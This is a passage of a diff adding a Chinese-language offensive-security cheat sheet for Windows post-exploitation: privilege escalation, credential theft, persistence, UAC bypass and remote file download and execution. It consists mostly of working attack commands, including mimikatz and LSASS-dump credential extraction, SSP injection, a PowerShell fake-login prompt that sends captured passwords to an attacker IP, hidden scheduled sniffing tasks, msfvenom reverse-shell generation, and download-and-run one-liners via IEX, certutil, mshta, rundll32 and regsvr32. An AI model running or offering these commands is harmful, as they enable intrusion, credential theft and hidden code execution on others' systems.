+	- KiTrap0D(Windows Server 2003 32/Windows Server 2008 32位/Windows7 32位/XP 32位)
+	- MS16-016 mrxdav.sys WebDav Local Privilege Escalation(win7 SP1 32位)
+	- EPATHOBJ::pprFlattenRec本地提权(Windows XP SP3/Windows2003 SP1/Windows7 SP1/32位)
+	- MS13-053：NTUserMessageCall Win32k内核池溢出(win7 32位)
+	- MS16-032 Secondary Logon Handle提权(Windows7-10/Windows Server2008/2012 32位和64位)
+	- RottenPotato提权(Local Privilege Escalation from Windows Service Accounts to SYSTEM)
+
+- UDF提权
+- 滥用Impersonation Privileges提权
+
+### 提取账户hash
+
+- 离线提取目标机hash
+- NTDS.dit中提取域内用户密码hash
+- DCsync获取所有域用户密码hash
+
+### 本地密码嗅探
+
+- 务必在高权限(root/system/administrator)下进行，挑个好时段，耐心等待，抓完就关，不建议在流量非常大的端口上进行这种嗅探操作
+- 抓ftp
+
+	- netdump.bat
+
+		- C:\Tools\rawsniff.exe --tcp --pcap ---dst_ip 192.168.159.133 --dst_port 21 --listen 192.168.159.133
+		- 默认生成的pcap文件会被放在 C:\Windows\SysWOW64 目录下
+
+- 抓web端口
+
+	- # rawsniff.exe --tcp --pcap ---dst_ip 192.168.159.154 --dst_port 81 --listen 192.168.159.154
+	- # rawsniff.exe --tcp --pcap ---dst_ip 192.168.159.154 --dst_port 8080 --listen 192.168.159.154
+
+- 利用系统计划任务去起监听
+
+	- # Attrib +s +a +h +r C:\Tools\rawsniff.exe
+	- # schtasks /create /RL HIGHEST /F /tn "NetDump" /tr "C:\Tools\netdump.bat" /sc DAILY /mo 1 /ST 08:45 /RU SYSTEM
+	- # schtasks /run /tn "NetDump"
+	- # schtasks /tn "NetDump" /query /fo list /v
+	- # tasklist | findstr /I "rawsniff.exe"
+
+- 清除
+
+	- # schtasks /delete /F /tn "NetDump"
+	- # del C:\Tools\netdump.bat /F
+
+### 凭据提取
+
+- 方法摘要
+
+	- mimikatz
+
+		- privilege::debug
+sekurlsa::logonpasswords
+		- mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords full" exit >> log.txt
+		- powershell  -ep Bypass -NoP -NonI -NoLogo -c IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent[.]com/[REDACTED]/Invoke-Mimikatz.ps1');Invoke-Mimikatz -Command 'privilege::debug sekurlsa::logonpasswords exit'
+		- Wmic  /NODE:"[REDACTED]" /USER:"[REDACTED]" /password:[REDACTED] process call create "cmd.exe /c (c:\windows\security\mnl.exe pr::dg sl::lp et -p >c:\windows\security\PList.txt) >> c:\windows\temp\temp.txt"
+
+	- 内存转储读取密码
+
+		- 任务管理转储lsass.exe为lsass.tmp/procdump.exe -accepteula -ma lsass.exe lsass.dmp
+mimikatz加载后抓取明文
+privilege::debug
+sekurlsa::minidump c:\users\ppbibo\appdata\local\temp\lsass.dmp
+sekurlsa::logonpasswords
+		- mimikatz "sekurlsa::minidump 1.dmp" "sekurlsa::logonPasswords full" exit
+
+	- SSP
+
+		- 注册SSP的DLL
+LSA可扩展，在系统启动时SSP会被加载到进程lsass.exe中
+可以自定义一个dll，在系统启动的时候被加载到进程lsass.exe
+HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa
+LSA 项中的 Security Packages 键值中存贮着相关SSP的DLL文件
+将Mimikatz的mimilib.dll复制到System32目录下
+添加mimilib到Security Packages的值中
+关机重启
+在C:\Windows\System32目录下生成一个kiwissp.log文件，并记录了登陆的账号密码
+		- 内存加载SSP
+利用Mimikatz中的misc::memssp加载mimilib至内存中去，加载至内存的好处就是无需重启系统，缺点在于不利于持续化
+privilege::debug
+misc::memssp
+锁定计算机管理员登陆之后会在C:\Windows\System32目录下生成mimilsa.log文件并记录账号密码
+
+	- 钓鱼记录明文
+
+		- lockphish 
+
+			- 一个自动化的工具，使用Web界面进行远程的社会工程学钓鱼，并且可规避了免杀的问题
+git clone https://github.com/thelinuxchoice/lockphish
+cd lockphish
+sudo bash lockphish.sh
+
+		- Powershell 简单钓凭证
+
+			- 目标机运行以下ps脚本:
+$creds = $host.ui.PromptForCredential("Login Required","Enter username and password.", "$env:username","NewBiosUserName");
+$v=$creds.GetNetworkCredential() | Format-List * | Out-String
+$v1=$v -replace "\r\n","-" -replace " ",""
+Invoke-WebRequest -Uri "http://192.168.200.73/$v1"
+# Write-Host -NoNewline $v1.Trim("-")
+攻击者监听:
+nc -lvp 80
+
+	- LaZagne
+
+		- https://github.com/AlessandroZ/LaZagne/releases/
+
+			- laZagne.exe all
+			- laZagne.exe all -oN
+			- laZagne.exe browsers
+
+	- 当前保存的凭据
+
+		- cmdkey /list
+
+	- 常用软件保存密码的注册表地址
+
+		- navicat
+
+			- MySQL
+HKEY_CURRENT_USER\Software\PremiumSoft\Navicat\Servers\<your  connection name>
+
+MariaDB
+HKEY_CURRENT_USER\Software\PremiumSoft\NavicatMARIADB\Servers\<your  connection name>
+
+MongoDB
+HKEY_CURRENT_USER\Software\PremiumSoft\NavicatMONGODB\Servers\<your  connection name>
+
+Microsoft  SQL
+HKEY_CURRENT_USER\Software\PremiumSoft\NavicatMSSQL\Servers\<your  connection name>
+
+Oracle
+HKEY_CURRENT_USER\Software\PremiumSoft\NavicatOra\Servers\<your  connection name>
+
+PostgreSQL
+HKEY_CURRENT_USER\Software\PremiumSoft\NavicatPG\Servers\<your  connection name>
+
+SQLite
+HKEY_CURRENT_USER\Software\PremiumSoft\NavicatSQLite\Servers\<your  connection name>
+
+		- SecureCRT
+
+			- xp/win2003
+C:\Documents   and Settings\USERNAME\Application Data\VanDyke\Config\Sessions
+
+win7/win2008以上
+C:\Users\USERNAME\AppData\Roaming\VanDyke\Config\Sessions
+
+		- Xshell
+
+			- Xshell 5
+%userprofile%\Documents\NetSarang\Xshell\Sessions
+
+Xshell 6
+%userprofile%\Documents\NetSarang  Computer\6\Xshell\Sessions
+
+		- WinSCP
+
+			- HKCU\Software\Martin  Prikryl\WinSCP 2\Sessions
+
+		- VNC
+
+			- RealVNC
+HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\vncserver
+Password
+
+TightVNC
+HKEY_CURRENT_USER\Software\TightVNC\Server  Value
+Password  or PasswordViewOnly
+
+TigerVNC
+HKEY_LOCAL_USER\Software\TigerVNC\WinVNC4
+Password
+
+UltraVNC
+C:\Program  Files\UltraVNC\ultravnc.ini
+passwd or  passwd2
+
+	- DPAPI
+
+		- Data Protection Application Programming Interface
+
+			- Windows 2000开始发布
+
+				- https://docs.microsoft.com/en-us/dotnet/standard/security/how-to-use-data-protection
+
+		- 加密函数
+
+			- CryptProtectData
+
+				- 对称加密
+
+					- 存放密钥的文件
+
+						- Master Key Files
+
+							- 路径
+
+								- %APPDATA%\Microsoft\Protect\{SID}\{GUID}
+								- {SID}为用户的安全标识符
+								- {GUID}为主密钥名称
+
+		- 解密函数
+
+			- CryptUnprotectData
+
+		- 作用范围
+
+			- outlook客户端密码
+windowscredential凭据
+chrome保存的密码凭据
+internetexplorer密码凭据
+...
+
+		- 利用用户的密码/hash或域备份密钥解密主密钥，然后解密被dpapi加密的数据
+		- mimikatz自动化数据解密
+
+			- 解密Chrome密码
+
+				- mimikatz dpapi::chrome /in:"%localappdata%\Google\Chrome\User Data\Default\Login  Data" /unprotect
+
+			- 解密Credential
+
+				- mimikatz vault::cred /patch
+
+- 从内存中提取明文凭据(Windows 10)
+- 普通权限访问用户本身创建进程提取凭据
+- 从凭据管理器中提取IE和Windows 凭据
+- 从Chrome浏览器中提取凭据
+- 提取各种浏览器中存储的Cookies
+- 从第三方软件中提取凭据
+- 从服务帐户获取凭据(Kerberoasting)
+- 破解DPAPI机制中用户的Master Key
+
+	- 从内存提取系统内所有当前登录用户的Master Key(通过读取Lsass进程信息)
+	- procdump dump出LSASS进程内存离线获取Master Key
+	- DPAPI_SYSTEM解密获取MasterKey
+
+- Master Key解密被加密的DPAPI blob(Chrome cookie等)
+- 解密域用户master key
+
+	- .pvk后缀的特权key可以解密任何一个域用户的master key
+	- BackupKey远程协议是运行在域控上的RPC服务，专门为授权用户解密DPAPI key（基于域范围的DPAPI备份key）的服务
+
+- 解析Preferred文件并修改延长MasterKey失效期限
+- 证书管理器中证书文件被用户或系统特有的DPAPI master key所保护
+
+	- vault::list尝试列出和解密\AppData\Local\Microsoft\Vault\位置的web证书
+	- vault::list尝试列出和解密\AppData\Local\Microsoft\Vault\位置的RDP或文件共享证书
+
+- 解密RDP证书获得明文凭据
+- dpapi::rdg解密Windows远程桌面连接管理器(保存RDP连接证书)DPAPI blob形式存储在.rdg文件中的明文密码
+
+	- dpapi::rdg /in:xx.rdg /unprotect
+
+- Mimikatz DPAPI缓存操作
+
+	- 保存缓存:dpapi::cache /save /file:C:\cache.bin
+	- 清空缓存:dpapi::cache /flush
+	- 载入缓存:dpapi::cache /load /file:C:\cache.bin
+
+- Seatbelt:对相关DPAPI文件进行检查
+
+	- https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/blob/master/Seatbelt.exe
+
+	- http://www.harmj0y.net/blog/redteaming/ghostpack/
+
+- Windows Password Recovery:通过Master Key File获取DPAPI blob file中的明文凭据
+
+	- https://www.passcape.com/index.php?section=downloads&category=28
+
+### 探测内网入口点
+
+- CrackMapExec扫描
+
+### 伪造windows访问令牌
+
+- 使用CobaltStrike窃取伪造指定进程的用户访问令牌
+- 使用 meterpreter 中 incognito 模块窃取伪造指定进程的用户访问令牌
+- 使用 incognito 伪造任意用户身份的访问令牌执行payload
+- 使用 Invoke-TokenManipulation.ps1 脚本伪造指定用户身份令牌执行 payload
+- 使用 Tokenvator.exe 来伪造指定用户的访问令牌执行任payload
+- 使用Mimikatz 伪造指定用户的访问令牌
+- 使用Invoke-TokenManipulation.ps1 伪造 system 访问令牌实现 mssql 本地免密码登录
+
+### 权限维持
+
+- 常用命令
+
+	- bitsadmin /create test  #创建一个任务
+bitsadmin /addfile test C:\windows\system32\calc.exe C:\Users\mac\Desktop\calc.exe #给任务添加一个下载或者负责对象，这里直接复制本地calc.exe
+bitsadmin /SetNotifyCmdLine test cmd.exe "cmd.exe /c calc.exe" #设置任务完成时将运行的命令
+bitsadmin /resume test  #激活任务
+
+- 域管权限维持
+
+	- Kerberoasting后门(随时破解ST获取服务账户密码)
+	- SSP记录登录到当前机器的所有账号密码明文
+	- DSRM账户同步域内任意账户密码
+	- 域控万能钥匙-Skeleton Key
+	- Hook PasswordChangeNotify函数隐形记录变更密码
+
+- 域内定点打击
+
+	- 针对特定域用户挂马
+	- 批量挂马实现域内用户批量上线
+	- 指定域用户打击(域用户登录日志利用)
+
+### 绕过windows安全机制
+
+- BypassUAC(针对windows单机系统)
+
+	- 使用CS 脚本快速bypass目标机器的UAC
+
+		- 审计当前系统可用于BypassUAC的方式(此脚本不兼容win8)
+		- beacon> elevate uac-eventvwr ok适用于win 7/8/8.1/10 32/64位
+		- beacon> elevate uac-dll ok适用于win 7/8/10 32/64位
+		- beacon> elevate uac-token-duplication ok适用于win7/8/8.1/10 64位
+		- beacon> elevate uac-fodhelper ok适用于win10 64位
+		- beacon> bypassuac ok beacon自带的bypass uac模块 适用于win7/10 32/64位
+		- beacon> elevate uac-wscript ok 需要目标存在相应的漏洞 适用于win7/8/10
+
+	- 使用外部UAC bypass脚本Bypass目标机器UAC
+
+		- Invoke-PsUACme.ps1 适用于win7/8.1
+		- Invoke-EnvBypass.ps1适用于win 10
+		- Invoke-SDCLTBypass.ps1适用于win10(目前未成功)
+		- Bypass-UAC.ps1 适用于win7/8 32/64位
+		- FodhelperBypass.ps1(通过win10自带fodhelper.exe) 适用于win10
+		- Akagi.exe-Defeating Windows User Account Control by abusing built-in Windows AutoElevate backdoor(x86-32/x64 Windows 7/8/8.1/10 client, some methods however works on server version too)
+
+	- 通过meterpreter shell对目标机器进行BypassUAC
+
+		- win10 64位
+
+			- exploit/windows/local/bypassuac_fodhelper
+
+		- win7 64位
+
+			- exploit/windows/local/bypassuac_eventvwr
+			- exploit/windows/local/bypassuac
+			- exploit/windows/local/bypassuac_injection
+
+### 内网穿透
+
+- 通过frp反向代理实现内网穿透
+- 通过EW搭建Socks5反向代理实现内网穿透
+
+### 文件下载执行
+
+- powershell
+
+	- 远程下载文件保存在本地
+
+		- powershell (new-object System.Net.WebClient).DownloadFile('http://192.168.28.128/imag/evil.txt','evil.exe')
+
+	- 远程执行命令
+
+		- powershell -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://192.168.28.128/imag/evil.txt'))"
+
+- bitsadmin
+
+	- bitsadmin /transfer n http://192.168.28.128/imag/evil.txt d:\test\1.txt
+
+- certutil
+
+	- 下载文件
+
+		- certutil -urlcache -split -f http://192.168.28.128/imag/evil.txt test.php
+
+	- 删除缓存
+
+		- certutil -urlcache -split -f http://192.168.28.128/imag/evil.txt delete
+
+- wget.exe
+
+	- https://eternallybored.org/misc/wget/
+
+		- wget -O "evil.txt" http://192.168.28.128/imag/evil.txt
+
+- curl
+
+	- curl -O http://192.168.28.128/imag/evil.txt
+
+- nc
+
+	- nc -lvp 3333 > d_evil.exe
+nc ip 3333 < s_evil.exe
+	- cat evil.exe | nc -lvp 3333
+nc ip 3333 > evil.exe
+
+- ipc$文件共享
+
+	- 建立远程IPC连接
+
+		- net use \\192.168.28.128\ipc$ /user:administrator "abc123!"
+
+	- 复制远程文件到本地主机
+
+		- copy \\192.168.28.128\c$\2.txt D:\test
+
+- FTP
+
+	- ftp xx.xx.xx.xx
+username
+password
+get file
+exit
+	- echo open ip >> ftp.txt
+echo username >> ftp.txt
+echo password >> ftp.txt
+echo get xx.rar >> ftp.txt
+echo bye >> ftp.txt
+ftp -s:ftp.txt
+
+- TFTP
+
+	- http://tftpd32.jounin.net/tftpd32_download.html
+
+		- tftp -i IP get filename 存放位置
+
+- VBS脚本
+
+	- echo Set xPost=createObject("Microsoft.XMLHTTP")>>b.vbs
+echo xPost.Open "GET","http://192.168.70.128/www.rar",0 >>b.vbs
+echo xPost.Send()>>b.vbs
+echo set sGet=createObject("ADODB.Stream")>>b.vbs
+echo sGet.Mode=3>>b.vbs
+echo sGet.Type=1>>b.vbs
+echo sGet.Open()>>b.vbs
+echo sGet.Open()>>b.vbs
+echo sGet.SaveToFile "C:\Users\sq\Desktop\a\www.rar",2 >>b.vbs
+cscript b.vbs
+
+- Python脚本
+
+	- #!/usr/bin/python
+import urllib2
+u = urllib2.urlopen('http://192.168.70.128/www.rar')
+localFile = open('1.rar', 'w')
+localFile.write(u.read())
+localFile.close()
+
+- WinScp
+
+	- 上传
+
+		- winscp.exe /console /command "option batch continue" "option confirm off" "open sftp://username:pass@192.168.28.131:22" "option transfer binary" "put D:\1.txt  /tmp/" "exit" /log=log_file.txt 
+
+	- 下载
+
+		- winscp.exe /console /command "option batch continue" "option confirm off" "open sftp://username:pass@192.168.28.131:22" "option transfer binary" "get /tmp D:\test\app\" "exit" /log=log_file.txt
+
+- msiexec
+
+	- 生成msi包
+
+		- msfvenom -p windows/exec CMD='net user test abc123! /add' -f msi > evil.msi
+
+	- 远程执行
+
+		- msiexec /q /i http://192.168.28.128/evil.msi
+
+- IEexec.exe
+
+	- 生成Payload
+
+		- msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.28.131 lport=4444 -f exe -o evil.exe
+
+	- 远程执行
+
+		- C:\Windows\Microsoft.NET\Framework64\v2.0.50727>caspol.exe -s off
+C:\Windows\Microsoft.NET\Framework64\v2.0.50727>IEExec.exe http://192.168.28.131/evil.exe
+
+- mshta
+
+	- 远程执行
+
+		- <HTML> 
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+<HEAD> 
+<script language="VBScript">
+Window.ReSizeTo 0, 0
+Window.moveTo -2000,-2000
+Set objShell = CreateObject("Wscript.Shell")
+objShell.Run "cmd.exe /c net user test password /add" // 这里填写命令
+self.close
+</script>
+<body>
+demo
+</body>
+</HEAD> 
+</HTML>
+		- mshta http://192.168.28.128/run.hta
+
+- rundll32
+
+	- C2框架JSRat
+
+		- 仅为rundll32.exe和regsvr32.exe生成恶意程序
+https://github.com/Hood3dRob1n/JSRat-Py.git
+./JSRat.py -i lhost -p lport
+url访问查看恶意代码
+
+		- rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WinHttp.WinHttpRequest.5.1");h.Open("GET","http://192.168.28.131:8888/connect",false);try{h.Send();b=h.ResponseText;eval(b);}catch(e){new%20ActiveXObject("WScript.Shell").Run("cmd /c taskkill /f /im rundll32.exe",0,true);}
+
+- regsvr32
+
+	- 执行命令
+
+		- regsvr32.exe /u /n /s /i:http://192.168.28.131:8888/file.sct scrobj.dll
+		- <?XML version="1.0"?>
+<scriptlet>
+<registration
+    progid="ShortJSRAT"
+    classid="{10001111-0000-0000-0000-0000FEEDACDC}" >
+    <script language="JScript">
+        <![CDATA[
+            ps  = "cmd.exe /c calc.exe";
+            new ActiveXObject("WScript.Shell").Run(ps,0,true);
+        ]]>
+</script>
+</registration>
+</scriptlet>
+
+- MSXSL.EXE
+
+	- https://www.microsoft.com/en-us/download/details.aspx?id=21714
+
+		- msxsl http://192.168.28.128/scripts/demo.xml http://192.168.28.128/scripts/exec.xsl
+		- demo.xml
+<?xml version="1.0"?>
+<?xml-stylesheet type="text/xsl" href="exec.xsl" ?>
+<customers>
+<customer>
+<name>Microsoft</name>
+</customer>
+</customers>
+		- exec.xsl
+<?xml version='1.0'?>
+<xsl:stylesheet version="1.0"
+xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
+xmlns:msxsl="urn:schemas-microsoft-com:xslt"
+xmlns:user="http://mycompany.com/mynamespace">
+
+<msxsl:script language="JScript" implements-prefix="user">
+   function xml(nodelist) {
+var r = new ActiveXObject("WScript.Shell").Run("cmd /c calc.exe");
+   return nodelist.nextNode().xml;
+
+   }
+</msxsl:script>
+<xsl:template match="/">
+   <xsl:value-of select="user:xml(.)"/>
+</xsl:template>
+</xsl:stylesheet>
+
+- pubprn.vbs
+
+	- "C:\Windows\System32\Printing_Admin_Scripts\zh-CN\pubprn.vbs" 127.0.0.1 script:https://gist.githubusercontent.com/enigma0x3/64adf8ba99d4485c478b67e03ae6b04a/raw/a006a47e4075785016a62f7e5170ef36f5247cdb/test.sct
+
+		- test.sct
+<?XML version="1.0"?>
+<scriptlet>
+<registration
+    description="Bandit"
+    progid="Bandit"
+    version="1.00"
+    classid="{AAAA1111-0000-0000-0000-0000FEEDACDC}"
+    remotable="true"
+    >
+</registration>
+<script language="JScript">
+<![CDATA[
+        var r = new ActiveXObject("WScript.Shell").Run("calc.exe");
+]]>
+</script>
+</scriptlet>   
+
 **\#1). linux:**
 
 **横向移动**
